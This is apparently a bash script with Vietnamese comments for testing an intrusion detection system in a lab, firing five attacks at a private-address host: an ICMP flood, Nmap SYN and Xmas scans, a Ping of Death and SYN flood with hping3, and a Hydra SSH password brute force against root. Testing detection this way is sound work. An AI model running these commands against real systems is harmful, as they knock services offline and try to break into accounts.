#!/bin/bash
# File: testing_scenarios.sh
# Dùng từ máy tấn công (Attacker) nhắm vào máy IDS (192.168.208.129)

# [KỊCH BẢN 1] Tấn công ICMP Flood
ping -f 192.168.208.129

# [KỊCH BẢN 2] Quét cổng bằng Nmap (SYN Scan, Xmas Scan)
nmap -sS 192.168.208.129
nmap -sX 192.168.208.129

# [KỊCH BẢN 3] Tấn công Ping of Death
sudo hping3 -1 -d 65000 --frag -c 5 192.168.208.129

# [KỊCH BẢN 4] Tấn công DoS (SYN Flood) đánh vào cổng 80
sudo hping3 -S --flood -p 80 192.168.208.129

# [KỊCH BẢN 5] Tấn công dò mật khẩu SSH (Hydra)
hydra -l root -P mylist.txt -t 4 ssh://192.168.208.129
